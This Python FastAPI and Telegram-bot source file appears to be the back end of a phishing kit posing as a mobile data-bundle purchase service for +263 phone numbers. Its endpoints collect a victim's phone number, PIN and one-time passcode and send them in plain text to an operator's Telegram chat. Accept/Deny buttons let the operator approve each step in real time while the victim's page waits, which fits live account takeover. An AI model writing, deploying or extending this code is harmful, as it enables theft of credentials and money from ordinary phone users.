import os
import uuid
from typing import Dict, Any, Optional
from fastapi import FastAPI, HTTPException, Request, Header
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CallbackQueryHandler, ContextTypes

# --- CONFIGURATION ---
# Values are read from environment variables for security
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID")
# You should set a secret token for the webhook
WEBHOOK_SECRET = os.environ.get("WEBHOOK_SECRET", "my-secret-token")

if not BOT_TOKEN or not ADMIN_CHAT_ID:
    raise ValueError("BOT_TOKEN and ADMIN_CHAT_ID environment variables are required")

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"], # In production, replace with your frontend's domain
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# In-memory storage (replace with a database for production)
transactions: Dict[str, Dict[str, Any]] = {}

# --- PYDANTIC MODELS ---
class LoginRequest(BaseModel):
    phone: str
    pin: str
    duration: str
    voice: int
    sms: int
    data: int
    price: str

class OTPRequest(BaseModel):
    phone: str
    otp: str
    duration: str
    price: str

# --- TELEGRAM BOT SETUP (Webhook Mode) ---
# We initialize the Application but don't start polling
ptb_app = Application.builder().token(BOT_TOKEN).build()

async def handle_telegram_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles the Accept/Deny button clicks from Telegram"""
    query = update.callback_query
    await query.answer()

    data = query.data.split(":")
    action = data[0]  # 'accept' or 'deny'
    tx_id = data[1]
    # step = data[2]  # 'login' or 'otp' (not strictly needed here)

    if tx_id in transactions:
        if action == "accept":
            transactions[tx_id]["status"] = "approved"
            await query.edit_message_text(
                text=f"{query.message.text}\n\n✅ **APPROVED** by Admin",
                parse_mode="Markdown"
            )
        elif action == "deny":
            transactions[tx_id]["status"] = "denied"
            await query.edit_message_text(
                text=f"{query.message.text}\n\n❌ **DENIED** by Admin",
                parse_mode="Markdown"
            )

# Add the handler to the application
ptb_app.add_handler(CallbackQueryHandler(handle_telegram_buttons))

# --- API ENDPOINTS ---

@app.post("/api/initiate-login")
async def initiate_login(req: LoginRequest):
    tx_id = str(uuid.uuid4())
    transactions[tx_id] = {
        "status": "pending",
        "type": "login",
        "data": req.model_dump()
    }

    message = (
        f"🔐 **NEW LOGIN REQUEST**\n\n"
        f"📱 **Phone:** +263 {req.phone}\n"
        f"🔑 **PIN:** ||{req.pin}||\n\n"
        f"📦 **Bundle:** {req.duration}\n"
        f"💰 **Price:** USD {req.price}\n\n"
        f"Waiting for your approval..."
    )

    keyboard = [[
        InlineKeyboardButton("✅ ACCEPT", callback_data=f"accept:{tx_id}:login"),
        InlineKeyboardButton("❌ DENY", callback_data=f"deny:{tx_id}:login")
    ]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    try:
        await ptb_app.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=message,
            reply_markup=reply_markup,
            parse_mode="MarkdownV2"
        )
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to send Telegram message: {e}")

    return {"transaction_id": tx_id, "message": "Request sent to admin"}

@app.post("/api/verify-otp")
async def verify_otp(req: OTPRequest):
    tx_id = str(uuid.uuid4())
    transactions[tx_id] = {
        "status": "pending",
        "type": "otp",
        "data": req.model_dump()
    }

    message = (
        f"🔢 **OTP VERIFICATION**\n\n"
        f"📱 **Phone:** +263 {req.phone}\n"
        f"🔢 **OTP Code:** `{req.otp}`\n\n"
        f"📦 **Bundle:** {req.duration}\n"
        f"💰 **Price:** USD {req.price}"
    )

    keyboard = [[
        InlineKeyboardButton("✅ ACCEPT", callback_data=f"accept:{tx_id}:otp"),
        InlineKeyboardButton("❌ DENY", callback_data=f"deny:{tx_id}:otp")
    ]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    try:
        await ptb_app.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=message,
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to send Telegram message: {e}")

    return {"transaction_id": tx_id, "message": "OTP sent to admin"}

@app.get("/api/status/{tx_id}")
async def get_status(tx_id: str):
    if tx_id not in transactions:
        raise HTTPException(status_code=404, detail="Transaction not found")
    return {"status": transactions[tx_id]["status"]}

# --- WEBHOOK ENDPOINTS ---

@app.post("/api/webhook/telegram")
async def telegram_webhook(request: Request, x_telegram_bot_api_secret_token: Optional[str] = Header(None)):
    """Endpoint for Telegram to send updates to"""
    if x_telegram_bot_api_secret_token != WEBHOOK_SECRET:
        raise HTTPException(status_code=403, detail="Invalid secret token")

    update_data = await request.json()
    update = Update.de_json(update_data, ptb_app.bot)
    await ptb_app.process_update(update)
    return {"status": "ok"}

@app.get("/api/webhook/set")
async def set_telegram_webhook():
    """Endpoint to set the Telegram webhook. Call this once after deployment."""
    # The URL of this Vercel deployment + the webhook path
    # You may need to adjust this if your URL is different
    base_url = os.environ.get("VERCEL_URL")
    if not base_url:
        raise HTTPException(status_code=500, detail="VERCEL_URL environment variable not set")

    webhook_url = f"https://{base_url}/api/webhook/telegram"
    try:
        await ptb_app.bot.set_webhook(
            url=webhook_url,
            secret_token=WEBHOOK_SECRET,
            drop_pending_updates=True
        )
        return {"status": "success", "webhook_url": webhook_url}
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to set webhook: {e}")